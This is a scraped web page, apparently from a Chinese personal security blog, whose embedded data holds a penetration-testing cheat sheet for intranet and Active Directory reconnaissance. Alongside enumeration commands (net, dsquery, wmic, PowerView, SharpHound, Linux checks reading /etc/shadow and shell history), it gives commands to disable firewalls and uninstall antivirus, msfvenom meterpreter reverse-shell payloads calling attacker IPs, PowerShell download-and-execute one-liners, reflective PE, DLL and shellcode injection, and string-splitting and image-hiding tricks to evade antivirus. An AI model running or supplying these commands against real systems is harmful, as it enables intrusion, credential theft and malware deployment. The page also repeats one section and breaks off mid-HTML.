data-expanded="true" data-astro-cid-uwaxo4qb> <div id="nav-content" class="flex scale-y-100 flex-col gap-2 opacity-100" data-astro-cid-uwaxo4qb> <button id="scroll-to-top" class="bg-background/80 hover:bg-background rounded-full p-2 shadow-lg backdrop-blur-sm transition-colors duration-200" aria-label="回到顶部" title="回到顶部" data-tooltip-interactive="false" data-tooltip-placement="left" data-astro-cid-uwaxo4qb> <i class="fa-solid fa-angle-up text-lg" aria-hidden="true" data-astro-cid-uwaxo4qb></i> </button> <button id="scroll-to-bottom" class="bg-background/80 hover:bg-background rounded-full p-2 shadow-lg backdrop-blur-sm transition-colors duration-200" aria-label="滚到底部" title="滚到底部" data-tooltip-interactive="false" data-tooltip-placement="left" data-astro-cid-uwaxo4qb> <i class="fa-solid fa-angle-down text-lg" aria-hidden="true" data-astro-cid-uwaxo4qb></i> </button> </div> <button id="toggle-nav" class="flex-center bg-background/80 hover:bg-background size-9 rounded-full shadow-lg backdrop-blur-sm transition-colors duration-200" aria-label="展开/收起工具栏" title="展开/收起工具栏" data-tooltip-interactive="false" data-tooltip-placement="left" data-astro-cid-uwaxo4qb> <i class="fa-solid fa-wand-magic-sparkles menu-nav-icon hidden text-sm transition-transform duration-300" aria-hidden="true" data-astro-cid-uwaxo4qb></i> <i class="fa-solid fa-xmark close-nav-icon text-sm transition-transform duration-300" aria-hidden="true" data-astro-cid-uwaxo4qb></i> </button> </div> <script type="module" src="/_astro/FloatingGroup.astro_astro_type_script_index_0_lang.CfPC7qUw.js"></script>  <astro-island uid="2fnbUn" prefix="r19" component-url="/_astro/MobileDrawerPanel.D2RaSu2k.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{}" ssr client="load" opts="{&quot;name&quot;:&quot;MobileDrawerPanel&quot;,&quot;value&quot;:true}" await-children><div id="drawer-overlay" class="fixed inset-0 z-[60] bg-black/50 hidden" role="presentation" aria-hidden="true"></div><div id="mobile-drawer" class="bg-gradient-start tablet:flex fixed inset-y-0 left-0 z-[70] hidden h-screen w-[70vw] min-w-64 transform px-4 pt-6 shadow-lg backdrop-blur-sm transition-transform duration-300 md:px-0 -translate-x-full" role="dialog" aria-label="导航菜单" aria-modal="true"><div class="flex h-full w-full flex-col overflow-auto"><div class="flex justify-end pb-2 pr-4"><div class="flex" id="close-drawer"><button class="flex-center text-shoka size-10 cursor-pointer rounded-full bg-white/20 select-none hidden" aria-label="关闭菜单" aria-expanded="false" type="button"><i class="text-xl fa-solid fa-xmark" aria-hidden="true" style="opacity:1;transform:rotate(90deg)"></i></button></div></div><astro-slot> <div class="page-home-sider shadow-home-sider sticky top-0 self-start max-w-64 flex-col overflow-hidden h-screen min-h-0 items-center tablet:flex mt-4 hidden w-full min-w-full p-0"> <astro-island uid="1yHeP7" prefix="r15" component-url="/_astro/HomeSiderPanel.Kcih-vV4.js" component-export="default" renderer-url="/_astro/client.lBR8ML2S.js" props="{&quot;type&quot;:[0,&quot;post&quot;],&quot;defaultSegmentType&quot;:[0,&quot;directory&quot;],&quot;homeInfo&quot;:[0,{&quot;avatar&quot;:[0,&quot;/img/avatar.webp&quot;],&quot;name&quot;:[0,&quot;Kaguya&quot;],&quot;description&quot;:[0,&quot;ACG / 养猫人 / 菜逼 / 黑客 / 臭美&quot;],&quot;postCount&quot;:[0,29],&quot;categoryCount&quot;:[0,7],&quot;tagCount&quot;:[0,40],&quot;routes&quot;:[1,[[0,{&quot;name&quot;:[0,&quot;文章&quot;],&quot;path&quot;:[0,&quot;/blog&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-pen-nib&quot;]}],[0,{&quot;name&quot;:[0,&quot;分类&quot;],&quot;path&quot;:[0,&quot;/blog/categories&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-layer-group&quot;]}],[0,{&quot;name&quot;:[0,&quot;标签&quot;],&quot;path&quot;:[0,&quot;/blog/tags&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-tags&quot;]}],[0,{&quot;name&quot;:[0,&quot;归档&quot;],&quot;path&quot;:[0,&quot;/blog/archives&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-solid fa-flag&quot;]}],[0,{&quot;name&quot;:[0,&quot;友链&quot;],&quot;path&quot;:[0,&quot;/blog/friends&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-link&quot;]}],[0,{&quot;name&quot;:[0,&quot;关于&quot;],&quot;path&quot;:[0,&quot;/blog/about&quot;],&quot;icon&quot;:[0,&quot;fa-solid fa-user&quot;]}]]],&quot;currentPath&quot;:[0,&quot;/blog/post/29/&quot;]}],&quot;tocHeadings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;windows安全标识符sid&quot;],&quot;text&quot;:[0,&quot;Windows安全标识符SID&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;临时http服务架设&quot;],&quot;text&quot;:[0,&quot;临时HTTP服务架设&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;cmd&quot;],&quot;text&quot;:[0,&quot;Cmd&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;wmi&quot;],&quot;text&quot;:[0,&quot;Wmi&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;wmi-1&quot;],&quot;text&quot;:[0,&quot;Wmi&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;powershell基础操作&quot;],&quot;text&quot;:[0,&quot;Powershell基础操作&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;powerview&quot;],&quot;text&quot;:[0,&quot;Powerview&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;linux&quot;],&quot;text&quot;:[0,&quot;Linux&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;addomain&quot;],&quot;text&quot;:[0,&quot;ADDomain&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;bloodhoundad&quot;],&quot;text&quot;:[0,&quot;BloodHoundAD&quot;]}]]],&quot;tocNumbering&quot;:[0,true],&quot;seriesPostItems&quot;:[1,[[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/内网和域/内网常用命令&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;内网信息获取&quot;],&quot;date&quot;:[3,&quot;2026-01-23T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;内网信息&quot;],[0,&quot;信息收集&quot;],[0,&quot;命令&quot;]]],&quot;categories&quot;:[1,[[0,&quot;Penetration&quot;],[0,&quot;内网和域&quot;]]]}],&quot;body&quot;:[0,&quot;# Windows安全标识符SID\n\n| 相对标识符 | 说明            |\n| ----- | ------------- |\n| 500   | 管理员           |\n| 501   | 来宾            |\n| 502   | 密钥分发中心服务的服务账户 |\n| 512   | 域管理员          |\n| 513   | 域用户           |\n| 514   | 域来宾           |\n| 515   | 域计算机          |\n| 516   | 域控制器          |\n| 544   | 内置管理员         |\n| 519   | 企业管理员         |\n# 临时HTTP服务架设\n```\npython2 -m SimpleHTTPServer \npython3 -m http.server 8080\nphp -S 0.0.0.0:8888\nopenssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -key key.pem -cert cert.pem -accept 443 –WWW\nruby -rwebrick -e \&quot;WEBrick::HTTPServer.new(:Port = 8888,:DocumentRoot = Dir.pwd).start\&quot;\nruby -run -e httpd . -p 8888\n```\n# Cmd\n\n```\nwhoami /user 查看当前用户SID\nnet config Workstation 查看当前计算机信息\nnet time /domain 判断主域\n错误5：存在域，当前不是域用户\n显示时间：存在域，当前是域内用户\n找不到域：不存在\nnet view /domain 列出域列表\nnet group \&quot;Domain Controllers\&quot; /domain查看主域控\nnltest /DCLIST:zone.com 查看域控\nnet group \&quot;domain admins\&quot; /domain 查看域管理员\nnet group \&quot;enterprise admins\&quot; /domain 查看企业管理员列表\nnet localgroup administrators /domain 查看管理组用户\nnet group \&quot;domain computers\&quot; /domain 查看域成员计算机\nnet accounts /domain 查看密码策略\nnet user /domain查看域内用户\nnet view /domain:dc 查询域内计算机\nnetsh firewall set opmode disable/enable 关闭windows防火墙(win2003)\nnetsh advfirewall set allprofiles state off/on(大于win2003)\narp -a查看arp表\nnet start 查看服务\nroute print查看路由表\nquery user查看登录机器的用户的连接状态\ntasklist /v 查看域管理员进程\ndsquery server查询域控制器\ndsquery computer 查询域内机器\ndsquery user 查询域用户\ndsquery ou 域内组织单位\n导出域DNS记录，文件保存在C:\\Windows\\System32\\dns\\\ndnscmd /zoneexport zone.com 1.txt\n导出LDAP数据库\nLDIFDE -f c:\\windows\\temp\\dump.ldf -n -m\n```\n# Wmi\n\n```\nwmic OS get Caption,CSDVersion,OSArchitecture,Version系统版本\nwmic service list brief 列出本机服务\nwmic process list brief 列出进程\nwmic process where name=\&quot;chrome.exe\&quot; get executablepath进程路径\nwmic process get caption,commandline /value1.txt查询所有进程参数\nwmic process where caption=\&quot;svchost.exe\&quot; get caption,commandline /value 查询某个进程命令行参数\n创建进程\nwmic process call create calc\nwmic process call create \&quot;C:\\shell.exe\&quot;\nwmic process call create \&quot;shutdown.exe -r -f -t 20\&quot;\n结束进程\nwmic process where name=\&quot;shell.exe\&quot; call terminate\nwmic process where processid=\&quot;2345\&quot; delete\nwmic process 2345 call terminate\nwmic startup list brief 列出自启动程序\nwmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 查看杀毒软件\nwmic netuse list brief 列出共享驱动盘\nwmic ntdomain list brief 查询域控制器\nwmic useraccount list brief 列出本机管理员及SID\nwmic qfe list brief 列出补丁列表\nwmic share get name,path 查看共享\nwmic startup list brief查看启动项\nwmic product get name,version 查看安装的软件\nwmic product where \&quot;name like &#39;%360%&#39;\&quot; get name 查看程序名\nwmic product where name=\&quot;360tray\&quot; call uninstall 卸载程序\nwmic process where \&quot;name like &#39;%360%&#39;\&quot; get name 查找进程全名\nwmic product where name=\&quot;360tray.exe\&quot; call terminate 停止程序\nwmic desktop get screensaversecure,screensavertimeout 查看屏保\n```\n# Wmi\n\n```\nwmic OS get Caption,CSDVersion,OSArchitecture,Version系统版本\nwmic service list brief 列出本机服务\nwmic process list brief 列出进程\nwmic process where name=\&quot;chrome.exe\&quot; get executablepath进程路径\nwmic process get caption,commandline /value1.txt查询所有进程参数\nwmic process where caption=\&quot;svchost.exe\&quot; get caption,commandline /value 查询某个进程命令行参数\n创建进程\nwmic process call create calc\nwmic process call create \&quot;C:\\shell.exe\&quot;\nwmic process call create \&quot;shutdown.exe -r -f -t 20\&quot;\n结束进程\nwmic process where name=\&quot;shell.exe\&quot; call terminate\nwmic process where processid=\&quot;2345\&quot; delete\nwmic process 2345 call terminate\nwmic startup list brief 列出自启动程序\nwmic /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List 查看杀毒软件\nwmic netuse list brief 列出共享驱动盘\nwmic ntdomain list brief 查询域控制器\nwmic useraccount list brief 列出本机管理员及SID\nwmic qfe list brief 列出补丁列表\nwmic share get name,path 查看共享\nwmic startup list brief查看启动项\nwmic product get name,version 查看安装的软件\nwmic product where \&quot;name like &#39;%360%&#39;\&quot; get name 查看程序名\nwmic product where name=\&quot;360tray\&quot; call uninstall 卸载程序\nwmic process where \&quot;name like &#39;%360%&#39;\&quot; get name 查找进程全名\nwmic product where name=\&quot;360tray.exe\&quot; call terminate 停止程序\nwmic desktop get screensaversecure,screensavertimeout 查看屏保\n```\n# Powershell基础操作\n\n```\n查看版本$PSVersionTable\n```\n\n**远程执行**\n\n```\npowershell -nop -w hidden -ep bypass \&quot;IEX (New-Object Net.WebClient).DownloadString(&#39;&#39;);Invoke-xxx\&quot;\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/100.png)\n\n**加载exe**\n\n```\nmsfvenom生成exe木马\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f exe  /var/www/html/1.exe  \n使用powersploit的Invoke-ReflectivePEInjection.ps1脚本\npowershell.exe -w hidden -exec bypass -c \&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/clymberps/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http://192.168.0.107/1.exe -ForceASLR\&quot; \n```\n\n**EXE2PS1**\n\n```\nhttp://192.168.0.107/ps/powersploit/CodeExecution/Convert-BinaryToString.ps1\n将exe转换为base64\nImport-Module .\\Convert-BinaryToString.ps1\nConvert-BinaryToString -FilePath .\\ms15051.exe\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/101.png)\n\n```\nhttp://192.168.0.107/ps/powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1\nInvoke-ReflectivePEInjection.ps1文件头部添加\nFunction MS15051{\n&lt;#\n.SYNOPSIS    \n.EXAMPLE\nC:\\PS MS15051 -Command \&quot;whoami\&quot;\n#\n [CmdletBinding()]\n    param(\n        [Parameter(Mandatory = $False)]\n        [string]\n        $Command\n  )\n$InputString = \&quot;文件的base64编码\&quot;\n$PEBytes = [System.Convert]::FromBase64String($InputString)\n文件尾部添加\nwrite-host (\&quot;[+] Executing Command: \&quot;+$Command)  -foregroundcolor \&quot;Green\&quot;\nInvoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $Command \nwrite-host (\&quot;[+] Done !\&quot;)  -foregroundcolor \&quot;Green\&quot;\n}\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/102.png)\n\n```\n远程下载执行\npowershell -nop -w hidden -ep bypass \&quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/CodeExecution/ms15051.ps1&#39;); MS15051 –Command \\\&quot;whoami\\\&quot;\&quot;\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/103.png)\n\n**绕过策略**\n\n```\npowershell Set-ExecutionPolicy Unrestricted需管理员权限，不受限执行\npowershell.exe -nop -exec bypass -c \&quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-xxx.ps1&#39;);invoke-xxx\&quot;\npowershell -exec bypass -File ./a.ps1&amp;Import-Module xxx\n```\n\n**Base64**\n\n```\nuse exploit/multi/script/web_delivery|target=2(PSH)\n&amp;\ncat payload.txt | iconv --to-code UTF-16LE |base64\npowershell -ep bypass -enc base64code\n```\n\n**写入bat绕过**\n\n```\npowershell -exec bypass -File ./a.ps1 \n将该命令保存为c.bat\n```\n\n**拼接拆分字符串**\n\n```\npowershell.exe  \n\&quot;\n$c1=&#39;powershell -c IEX&#39;; \n$c2=&#39;(New-Object Net.WebClient).Downlo&#39;; \n$c3=&#39;adString(\&quot;http://192.168.197.192/a.ps1\&quot;)&#39;; \necho ($c1,$c2,$c3) \n\&quot; \n先将命令拆分为字符串，然后进行拼接。echo修改为IEX执行。\npowershell $c2=&#39;IEX (New-Object Net.WebClient).Downlo&#39;;$c3=&#39;adString(&#39;&#39;http://x.x.x.x/a&#39;&#39;)&#39;; $Text=$c2+$c3; IEX(-join $Text)\n```\n\n**Replace替换函数**\n\n```\npowershell -noexit \&quot;$c1=&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2=&#39;123(&#39;&#39;http://192.168.0.108/1.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)\&quot; \n```\n\n**HTTP字符拼接绕过**\n\n```\n也可以对http字符进行绕过，同样可以bypass\npowershell \&quot;$a=&#39;IEX((new-object net.webclient).downloadstring(\&quot;ht&#39;;$b=&#39;tp://192.168.197.192/a.ps1\&quot;))&#39;;IEX ($a+$b)\&quot;  \n```\n\n**图片免杀**\n\n```\n通过图片免杀执行powershell的脚本Invoke-PSImage.ps1，主要把payload分散存到图片的像素中,最后到远端执行时,再重新遍历重组像素中的payload执行。\nhttps://github.com/peewpw/Invoke-PSImage\n1900*1200的图片x.jpg。\nC:\\powershell \nPS C:\\ Import-Module .\\Invoke-PSImage.ps1 \nPS C:\\ Invoke-PSImage -Script .\\a.ps1 -Image .\\x.jpg -Out .\\reverse_shell.png -Web \na.ps1是msf木马，-Out 生成reverse_shell.png图片，-Web 输出从web读取的命令。\n将reverse_shell.png移动至web目录，替换url地址。在powershell下执行即可。\n```\n\n**加载shellcode**\n\n```\nmsfvenom生成脚本木马\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.72.164 LPORT=4444 -f powershell -o /var/www/html/test  \n在windows靶机上运行一下命令\nPS IEX(New-Object Net.WebClient).DownloadString(\&quot;http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-Shellcode.ps1\&quot;) \nPS IEX(New-Object Net.WebClient).DownloadString(\&quot;http://192.168.72.164/test\&quot;) \nInvoke-Shellcode -Shellcode $buf -Force  运行木马 \n使用Invoke-Shellcode.ps1脚本执行shellcode\n即可反弹meterpreter shell\n```\n\n**加载dll**\n\n```\n使用msfvenom 生成dll木马脚本\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.72.164 lport=4444 -f dll -o /var/www/html/test.dll \n将生成的dll上传到目标的C盘。在靶机上执行以下命令\nPS IEX(New-Object Net.WebClient).DownloadString(\&quot;http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-DllInjection.ps1\&quot;) \nStart-Process c:\\windows\\system32\\notepad.exe -WindowStyle Hidden  \n创建新的进程启动记事本，并设置为隐藏\nInvoke-DllInjection -ProcessID xxx -Dll c:\\test.dll 使用notepad的PID  \nMsf\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nrun\n```\n# Powerview\n\n```\n获取当前域信息\npowershell -exec bypass -Command \&quot;&amp;{Import-Module .\\powerview.ps1; Get-NetDomain}\&quot;\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/302.png)\n\n```\npowershell -exec bypass -Command \&quot;&amp;{Import-Module .\\powerview.ps1; get-netforest}\&quot;\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/303.png)\n\n```\n枚举管理员\npowershell -exec bypass -Command \&quot;&amp;{Import-Module .\\powerview.ps1; Invoke-EnumerateLocalAdmin}\&quot;\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/304.png)\n\n```\n查询管理在线的机器\npowershell -exec bypass -Command \&quot;&amp;{Import-Module .\\powerview.ps1; invoke-userhunter}\&quot;\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/305.png)\n\n```\n查看域内机器以administrator权限运行的进程\npowershell -exec bypass -Command \&quot;&amp;{Import-Module .\\powerview.ps1; invoke-processhunter }\&quot;\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/306.png)\n\n```\n或指定参数userfile和computerfile查询某台机器某个用户的进程\npowershell -exec bypass -Command \&quot;&amp;{Import-Module .\\powerview.ps1; invoke-processhunter -Userfile .\\user.txt -computerfile .\\host.txt}\&quot;\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/307.png)\n\n```\n查询域内机器共享\npowershell -exec bypass -Command \&quot;&amp;{Import-Module .\\powerview.ps1; Invoke-sharefinder}\&quot;\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/308.png)\n\n```\n查询域内机器\nGet-NetComputer -Domain zone.com\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/309.png)\n\n```\nFind-LocalAdminAccess -verbose 查询域内本地用户能登录的机器\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/310.png)\n\n```\nDev-powerview\n获取域控机器和win版本\nGet-DomainController |select name,osversion|fl \n枚举其他域： Get-NetDomain -Domain &lt;DomainName\n获取域 SID： Get-DomainSID\n获取域策略：Get-DomainPolicy\n获取域控制器：\nGet-NetDomainController\nGet-NetDomainController -Domain &lt;DomainName\n枚举域用户：\nGet-NetUser\nGet-NetUser -SamAccountName &lt;user \nGet-NetUser | select cn\n检查上次修改密码\nGet-UserProperty -Properties pwdlastset\n枚举域计算机\nGet-NetComputer -FullData\nGet-DomainGroup\n枚举存活主机\nGet-NetComputer -Ping\n枚举组策略：Get-NetGPO\n显示某台机器的活动策略\nGet-NetGPO -ComputerName &lt;Name of the PC\n枚举 OU：\nGet-NetOU -FullData \nGet-NetGPO -GPOname &lt;The GUID of the GPO\n枚举域信任：\nGet-NetDomainTrust\nGet-NetDomainTrust -Domain &lt;DomainName\n查找当前域中当前用户具有本地管理员访问权限的所有计算机\nFind-LocalAdminAccess -Verbose\n在域的所有机器上查找本地管理员\nInvoke-EnumerateLocalAdmin -Verbose\n全部使用技巧\nhttps://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993\n```\n# Linux\n\n```\n操作系统&amp;内核版本&amp;环境变量\ncat /etc/issue\ncat /etc/*-release\ncat /etc/lsb-release\ncat /etc/redhat-release\ncat /proc/version\nuname -a\nuname -mrs\nrpm -q kernel\ndmesg | grep Linux\nls /boot | grep vmlinuz-\ncat /etc/profile\ncat /etc/bashrc\ncat ~/.bash_profile\ncat ~/.bashrc\ncat ~/.bash_logout\nenv\nset\nRoot权限进程\nps aux | grep root\nps -ef | grep root\n计划任务\ncrontab -l\nls -alh /var/spool/cron\nls -al /etc/ | grep cron\nls -al /etc/cron*\ncat /etc/cron*\ncat /etc/at.allow\ncat /etc/at.deny\ncat /etc/cron.allow\ncat /etc/cron.deny\ncat /etc/crontab\ncat /etc/anacrontab\ncat /var/spool/cron/crontabs/root\nIP信息\n/sbin/ifconfig -a\ncat /etc/network/interfaces\ncat /etc/sysconfig/network\n连接信息\ngrep 80 /etc/services\nnetstat -antup\nnetstat -antpx\nnetstat -tulpn\nchkconfig --list\nchkconfig --list | grep 3:on\nlast\nw\n用户信息\nid\nwhomi\nw\nlast\ncat /etc/passwd\ncat /etc/group\ncat /etc/shadow\nls -alh /var/mail/\ngrep -v -E \&quot;^#\&quot; /etc/passwd | awk -F: &#39;$3 == 0 { print $1}&#39;   # 列出超级用户\nawk -F: &#39;($3 == \&quot;0\&quot;) {print}&#39; /etc/passwd   #列出超级用户\ncat /etc/sudoers\nsudo –l\n操作记录\ncat ~/.bash_history\ncat ~/.nano_history\ncat ~/.atftp_history\ncat ~/.mysql_history\ncat ~/.php_history\n可写目录\nfind / -writable -type d 2/dev/null      # 可写目录\nfind / -perm -222 -type d 2/dev/null     # 可写目录 \nfind / -perm -o w -type d 2/dev/null     # 可写目录\nfind / -perm -o x -type d 2/dev/null     # 可执行目录\nfind / \\( -perm -o w -perm -o x \\) -type d 2/dev/null   # 可写可执行目录\n```\n# ADDomain\n\n```\n获取当前域： Get-ADDomain\n枚举其他域： Get-ADDomain -Identity &lt;Domain\n获取域 SID： Get-DomainSID\n获取域控制器：\nGet-ADDomainController\nGet-ADDomainController -Identity &lt;DomainName\n枚举域用户：\nGet-ADUser -Filter * -Identity &lt;user -Properties *\n枚举域计算机：\nGet-ADComputer -Filter * -Properties *\nGet-ADGroup -Filter * \n枚举域信任：\nGet-ADTrust -Filter *\nGet-ADTrust -Identity &lt;DomainName\n枚举域林信任：\nGet-ADForest\nGet-ADForest -Identity &lt;ForestName\n枚举本地 AppLocker 有效策略：\nGet-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n```\n# BloodHoundAD\n\n**AzureHound**\n\n```\n. .\\AzureHound.ps1\nInvoke-AzureHound\n```\n\n**BloodHound**\n\n```\n.\\SharpHound.exe -c all -d active.htb --searchforest\n搜集不包括GPOLocalGroup的信息\n.\\SharpHound.exe -c all,GPOLocalGroup\n只从DC手机信息\n.\\SharpHound.exe --CollectionMethod DCOnly\n.\\SharpHound.exe -c all --LdapUsername &lt;UserName --LdapPassword &lt;Password --JSONFolder &lt;PathToFile\n.\\SharpHound.exe -c all --LdapUsername &lt;UserName --LdapPassword &lt;Password --domaincontroller 10.10.10.100 -d active.htb\n.\\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\\Windows\\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23\n或使用powershell\nhttps://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1\n/usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1\nInvoke-BloodHound -SearchForest -CSVFolder C:\\Users\\Public\nInvoke-BloodHound -CollectionMethod All  -LDAPUser &lt;UserName -LDAPPass &lt;Password -OutputDirectory &lt;PathToFile\n或远程使用BloodHound Python\nhttps://github.com/fox-it/BloodHound.py\npip install bloodhound\nbloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all\n使用 Certipy 收集更多用于证书利用的数据\ncertipy find &#39;corp.local/john:Passw0rd@dc.corp.local&#39; -bloodhound\n然后将 zip/json 文件导入 Neo4J 数据库并进行查询。\napt install bloodhound \n启动BloodHound和数据库\nneo4j console\n或者使用docker\ndocker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/bloodhound neo4j\n./bloodhound --no-sandbox\n访问http://127.0.0.1:7474  user:neo4J, pass:neo4j\n```&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/内网和域/内网常用命令.md&quot;],&quot;digest&quot;:[0,&quot;136ee43f6e8d678c&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;windows安全标识符sid\&quot;&gt;Windows安全标识符SID&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#windows安全标识符sid\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;相对标识符&lt;/th&gt;&lt;th&gt;说明&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;500&lt;/td&gt;&lt;td&gt;管理员&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;501&lt;/td&gt;&lt;td&gt;来宾&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;502&lt;/td&gt;&lt;td&gt;密钥分发中心服务的服务账户&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;512&lt;/td&gt;&lt;td&gt;域管理员&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;513&lt;/td&gt;&lt;td&gt;域用户&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;514&lt;/td&gt;&lt;td&gt;域来宾&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;515&lt;/td&gt;&lt;td&gt;域计算机&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;516&lt;/td&gt;&lt;td&gt;域控制器&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;544&lt;/td&gt;&lt;td&gt;内置管理员&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;519&lt;/td&gt;&lt;td&gt;企业管理员&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n&lt;h1 id=\&quot;临时http服务架设\&quot;&gt;临时HTTP服务架设&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#临时http服务架设\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python2 -m SimpleHTTPServer &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;python3 -m http.server 8080&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;php -S 0.0.0.0:8888&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;openssl s_server -key key.pem -cert cert.pem -accept 443 –WWW&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ruby -rwebrick -e \&quot;WEBrick::HTTPServer.new(:Port = 8888,:DocumentRoot = Dir.pwd).start\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ruby -run -e httpd . -p 8888&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;cmd\&quot;&gt;Cmd&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#cmd\&quot;&gt;&lt;span class=\&quot;icon 